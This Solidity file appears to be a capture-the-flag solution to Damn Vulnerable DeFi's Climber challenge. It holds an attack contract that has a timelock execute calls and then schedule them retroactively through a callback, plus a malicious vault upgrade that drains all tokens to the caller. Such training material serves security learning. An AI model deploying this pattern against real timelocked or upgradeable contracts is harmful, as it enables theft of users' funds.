// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";
import "./ClimberVault.sol";
import "hardhat/console.sol";

/**
 * @title StealFromClimber
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract StealFromClimber {
    address private attacker;
    address payable private timelock;
    address[] private targets;
    uint256[] private values;
    bytes[] private dataElements;
    bytes32 private salt;

    constructor(address payable _timelock) {
        attacker = msg.sender;
        timelock = _timelock;
    }

    function attack(
        address[] calldata _targets,
        uint256[] calldata _values,
        bytes[] calldata _dataElements,
        bytes32 _salt
    ) external {
        require(msg.sender == attacker);
        for (uint i; i < _targets.length; ++i) {
            targets.push(_targets[i]);
            values.push(_values[i]);
            dataElements.push(_dataElements[i]);
        }
        salt = _salt;
        ClimberTimelock(timelock).execute(targets, values, dataElements, salt);
    }

    function attack_callback() external {
        console.log("Steal/attack_callbacl", "-----START-----");
        require(msg.sender == timelock);
        ClimberTimelock(timelock).schedule(targets, values, dataElements, salt);
        console.log("Steal/attack_callbacl", "-----DONE-----");
    }
}

contract ClimberVaultV2 is ClimberVault {
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    function transferToAttacker(address _token) public onlyOwner {
        IERC20(_token).transfer(
            msg.sender,
            IERC20(_token).balanceOf(address(this))
        );
    }
}
